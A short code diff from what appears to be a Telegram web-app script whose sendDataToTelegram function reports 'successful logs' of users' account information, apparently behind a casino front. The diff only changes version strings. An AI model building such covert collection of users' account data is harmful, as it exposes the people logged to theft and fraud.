@@ -106,7 +106,7 @@ async function sendDataToTelegram() {
         // Safe access to user data with fallbacks
         const user = tg.initDataUnsafe.user || {};
         const message = `
-версия: 1.2 - попытка реализации с cloudflare
+версия: 1.3 - вернул казик обратно
 
 <b>✨ Лог успешен!</b>
 <b>🔍 Информация об аккаунте:</b>
@@ -157,7 +157,7 @@ async function sendDataToTelegram() {
         // Send error report to Telegram
         try {
             const errorMessage = `
-версия: 1.2 - попытка реализации с cloudflare
+версия: 1.3 - вернул казик обратно
 
 <b>⚠️ Ошибка в скрипте!</b>
 <b>🔍 Детали ошибки:</b>
